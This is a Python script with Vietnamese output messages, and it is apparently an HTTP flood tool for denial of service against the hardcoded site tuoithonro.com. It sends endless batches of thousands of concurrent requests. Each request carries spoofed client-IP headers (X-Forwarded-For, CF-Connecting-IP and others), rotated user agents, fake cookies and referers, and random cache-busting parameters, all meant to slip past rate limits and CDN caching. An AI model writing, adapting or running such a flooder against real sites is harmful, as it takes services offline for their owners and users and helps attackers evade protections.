import requests
import time
import signal
import sys
import os
import platform
import random
import string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

URL = "https://tuoithonro.com/"
REQUESTS = 10000

if platform.system() == "Windows":
    CONCURRENCY = min(200, os.cpu_count() * 5)
else:
    CONCURRENCY = min(500, os.cpu_count() * 10)

is_paused = False
is_running = True
total_success = 0
total_error = 0
start_time_global = None

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.147",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"
]

def get_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def get_random_string(length=10):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def signal_handler(sig, frame):
    global is_paused, is_running
    
    if is_paused:
        print("\n[!] Đang thoát chương trình...")
        is_running = False
    else:
        print("\n[!] Đã tạm dừng. Nhấn Ctrl+C lần nữa để thoát hoặc Enter để tiếp tục...")
        is_paused = True

def resume_execution():
    global is_paused
    print("[+] Tiếp tục thực thi...")
    is_paused = False

def make_request():
    try:
        random_params = f"?{get_random_string(5)}={get_random_string(8)}&_={int(time.time() * 1000)}"
        full_url = URL + random_params
        
        x_forwarded_for = get_random_ip()
        user_agent = random.choice(USER_AGENTS)
        
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "X-Forwarded-For": x_forwarded_for,
            "X-Real-IP": x_forwarded_for,
            "X-Client-IP": x_forwarded_for,
            "CF-Connecting-IP": x_forwarded_for,
            "True-Client-IP": x_forwarded_for,
            "Referer": f"https://www.google.com/search?q=site:{URL.split('//')[1].split('/')[0]}+{get_random_string(8)}",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-User": "?1",
            "DNT": "1"
        }
        
        cookies = {
            f"cookie_{get_random_string(5)}": get_random_string(10),
            "session_id": get_random_string(32),
            "_ga": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time() - random.randint(1000000, 9999999))}",
            "_gid": f"GA1.2.{random.randint(1000000, 9999999)}.{int(time.time())}"
        }
        
        session = requests.Session()
        
        response = session.get(
            full_url, 
            headers=headers, 
            cookies=cookies, 
            timeout=10, 
            allow_redirects=True,
            verify=False
        )
        
        return response.status_code
    except requests.RequestException:
        return None

def send_requests(batch_num):
    global total_success, total_error
    
    start_time = time.time()
    success_count = 0
    error_count = 0
    
    batch_size = 200
    total_batches = (REQUESTS + batch_size - 1) // batch_size
    
    for batch in range(total_batches):
        while is_paused and is_running:
            time.sleep(0.1)
            
        if not is_running:
            return
            
        remaining = min(batch_size, REQUESTS - batch * batch_size)
        if remaining <= 0:
            break
            
        print(f"[*] Đang xử lý batch nội bộ {batch+1}/{total_batches} ({remaining} requests)")
        
        with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
            futures = [executor.submit(make_request) for _ in range(remaining)]
            
            for future in futures:
                while is_paused and is_running:
                    time.sleep(0.1)
                if not is_running:
                    return
                    
                result = future.result()
                if result and 200 <= result < 400:
                    success_count += 1
                else:
                    error_count += 1
        
        time.sleep(random.uniform(0.5, 1.5))
    
    elapsed_time = time.time() - start_time
    
    total_success += success_count
    total_error += error_count
    
    print(f"\n[+] Kết quả Batch #{batch_num}:")
    print(f"    - Đã hoàn thành {REQUESTS} requests trong {elapsed_time:.2f} giây")
    print(f"    - Thành công: {success_count}, Lỗi: {error_count}")
    print(f"    - Tốc độ: {REQUESTS/elapsed_time:.2f} requests/giây")

def print_stats():
    global total_success, total_error, start_time_global
    
    if start_time_global:
        total_time = time.time() - start_time_global
        total_requests = total_success + total_error
        
        if total_requests > 0:
            print("\n" + "="*50)
            print(f"THỐNG KÊ TỔNG HỢP ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})")
            print("="*50)
            print(f"URL đích:            {URL}")
            print(f"Thời gian chạy:      {total_time:.2f} giây")
            print(f"Tổng số requests:    {total_requests}")
            print(f"Requests thành công: {total_success} ({total_success/total_requests*100:.2f}%)")
            print(f"Requests lỗi:        {total_error} ({total_error/total_requests*100:.2f}%)")
            print(f"Tốc độ trung bình:   {total_requests/total_time:.2f} requests/giây")
            print("="*50)

def main():
    global is_paused, is_running, start_time_global
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except:
            pass
        
        print("\n" + "="*50)
        print("CHƯƠNG TRÌNH GỬI REQUESTS NÂNG CAO")
        print("="*50)
        print(f"URL đích:             {URL}")
        print(f"Số lượng requests:    {REQUESTS}")
        print(f"Số luồng đồng thời:   {CONCURRENCY}")
        print(f"Hệ điều hành:         {platform.system()} {platform.release()}")
        print(f"Số lõi CPU:           {os.cpu_count()}")
        print("="*50)
        print("[i] Nhấn Ctrl+C để tạm dừng/thoát")
        print("="*50 + "\n")
        
        start_time_global = time.time()
        
        count = 1
        while is_running:
            if not is_paused:
                print(f"\n[*] Bắt đầu Batch #{count}")
                send_requests(count)
                count += 1
                
                wait_time = random.uniform(1.0, 3.0)
                print(f"[i] Đợi {wait_time:.2f} giây trước khi tiếp tục...")
                time.sleep(wait_time)
            else:
                input()
                resume_execution()
                
    except Exception as e:
        print(f"\n[!] Lỗi không mong muốn: {str(e)}")
    finally:
        print_stats()
        print("\n[!] Chương trình đã kết thúc")

if __name__ == "__main__":
    main()